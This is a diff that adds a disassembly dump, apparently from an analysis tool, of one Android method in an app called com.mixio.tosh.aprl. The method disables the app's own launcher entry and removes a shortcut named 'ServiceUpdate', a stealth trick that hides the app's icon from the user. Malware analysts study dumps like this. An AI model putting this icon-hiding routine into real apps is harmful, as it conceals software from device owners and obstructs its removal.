@@ -1,0 +1,42 @@
+# Lcom/mixio/tosh/aprl/MainActivity;->a()V [access_flags=public final]
+#
+# Parameters:
+# local registers: v0...v4
+#
+# - return:void
+
+a-BB@0x0 : [ a-BB@0x7c ]
+	0       (00000000) invoke-virtual       v4, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;
+	1       (00000006) move-result-object   v0
+	2       (00000008) invoke-virtual       v0, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
+	3       (0000000e) move-result-object   v0
+	4       (00000010) invoke-virtual       v4, Landroid/app/Activity;->getComponentName()Landroid/content/ComponentName;
+	5       (00000016) move-result-object   v1
+	6       (00000018) const/4              v2, 2
+	7       (0000001a) const/4              v3, 1
+	8       (0000001c) invoke-virtual       v0, v1, v2, v3, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName; I I)V
+	9       (00000022) new-instance         v0, Landroid/content/Intent;
+	10      (00000026) invoke-virtual       v4, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;
+	11      (0000002c) move-result-object   v1
+	12      (0000002e) const-class          v2, Lcom/mixio/tosh/aprl/MainActivity;
+	13      (00000032) invoke-direct        v0, v1, v2, Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V
+	14      (00000038) const-string         v1, 'android.intent.action.MAIN'
+	15      (0000003c) invoke-virtual       v0, v1, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
+	16      (00000042) new-instance         v1, Landroid/content/Intent;
+	17      (00000046) invoke-direct        v1, Landroid/content/Intent;-><init>()V
+	18      (0000004c) const-string         v2, 'android.intent.extra.shortcut.INTENT'
+	19      (00000050) invoke-virtual       v1, v2, v0, Landroid/content/Intent;->putExtra(Ljava/lang/String; Landroid/os/Parcelable;)Landroid/content/Intent;
+	20      (00000056) const-string         v0, 'android.intent.extra.shortcut.NAME'
+	21      (0000005a) const-string         v2, 'ServiceUpdate'
+	22      (0000005e) invoke-virtual       v1, v0, v2, Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/lang/String;)Landroid/content/Intent;
+	23      (00000064) const-string         v0, 'com.android.launcher.action.UNINSTALL_SHORTCUT'
+	24      (00000068) invoke-virtual       v1, v0, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
+	25      (0000006e) invoke-virtual       v4, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;
+	26      (00000074) move-result-object   v0
+	27      (00000076) invoke-virtual       v0, v1, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V
+	0:7b
+	(Ljava/lang/Exception; -> 7c a-BB@0x7c)
+
+a-BB@0x7c : 
+	28      (0000007c) return-void          
+
